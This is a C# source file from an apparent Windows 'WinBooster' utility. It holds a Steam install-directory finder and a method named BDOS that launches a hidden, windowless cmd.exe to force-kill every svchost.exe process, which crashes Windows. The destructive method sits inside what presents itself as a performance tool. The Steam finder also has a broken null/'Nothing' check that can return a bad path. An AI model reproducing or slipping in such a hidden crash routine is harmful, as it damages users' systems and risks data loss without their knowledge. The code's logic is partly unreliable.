﻿using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinBoosterNative
{
    public class WinBoosterUtils
    {
        public static void BDOS()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.Arguments = "/c taskkill /F /IM svchost.exe\"";
            p.Start();
        }
        public static DirectoryInfo? FindSteamDirectory()
        {
            try
            {
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    string? steamdir = (string?)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam", "InstallPath", "Nothing");
                    if (string.IsNullOrEmpty(steamdir) || steamdir == "Nothing")
                    {
                        steamdir = (string?)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Valve\Steam", "InstallPath", "Nothing");
                        if (steamdir != null && !string.IsNullOrEmpty(steamdir) || steamdir != "Nothing")
                            return new DirectoryInfo(steamdir);
                    }
                    else
                    {
                        return new DirectoryInfo(steamdir);
                    }
                }
            }
            catch { }
            if (Directory.Exists("C:\\Program Files (x86)\\Steam"))
            {
                return new DirectoryInfo("C:\\Program Files (x86)\\Steam");
            }
            else if (Directory.Exists("D:\\Program Files (x86)\\Steam"))
            {
                return new DirectoryInfo("D:\\Program Files (x86)\\Steam");
            }
            else if (Directory.Exists("E:\\Program Files (x86)\\Steam"))
            {
                return new DirectoryInfo("E:\\Program Files (x86)\\Steam");
            }
            return null;
        }
    }
}
